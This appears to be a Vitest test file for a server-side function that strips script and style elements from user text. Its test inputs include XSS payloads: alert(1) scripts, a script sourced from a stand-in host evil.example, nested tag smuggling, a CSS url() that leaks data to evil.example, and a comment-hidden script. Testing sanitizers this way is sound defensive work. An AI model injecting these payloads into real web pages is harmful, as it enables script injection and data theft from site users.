import { describe, expect, it } from "vitest";

import { stripScriptAndStyle } from "~/lib/sanitize-text.server";

function hasRunnableScriptToken(value: string): boolean {
  return />[^<]*script[^>]*</i.test(value);
}

describe("stripScriptAndStyle", () => {
  const stripped = (value: string) => stripScriptAndStyle(value).trim();

  it("strips a well-formed script element", () => {
    expect(stripped("<script>alert(1)</script>")).toBe("");
  });

  it("strips script closers with trailing whitespace", () => {
    expect(stripped("<script>alert(1)</script >")).toBe("");
  });

  it("strips script closers with attributes", () => {
    expect(stripped("<script>alert(1)</script foo=\"bar\">")).toBe("");
  });

  it("strips script blocks with unicode-escaped openers inside the element", () => {
    expect(stripped("<script src=//evil.example/x.js>\u003c/script>")).toBe("");
    expect(stripped("<script src=//evil.example/x.js>\u003c/script foo>")).toBe("");
  });

  it("strips nested script tag smuggling without leaving a runnable script element", () => {
    const result = stripScriptAndStyle("<scr<script>ipt>alert(1)</script>");
    expect(hasRunnableScriptToken(result)).toBe(false);
  });

  it("strips style elements including malformed closers", () => {
    expect(
      stripped("<style>body{background:url(\"//evil.example/?leak\")}</style>"),
    ).toBe("");
    expect(stripped("<style>body{color:red}</style >")).toBe("");
  });

  it("removes HTML comments that can hide script payloads", () => {
    expect(stripScriptAndStyle("<!--<script>alert(1)</script>-->safe")).toBe("safe");
  });
});
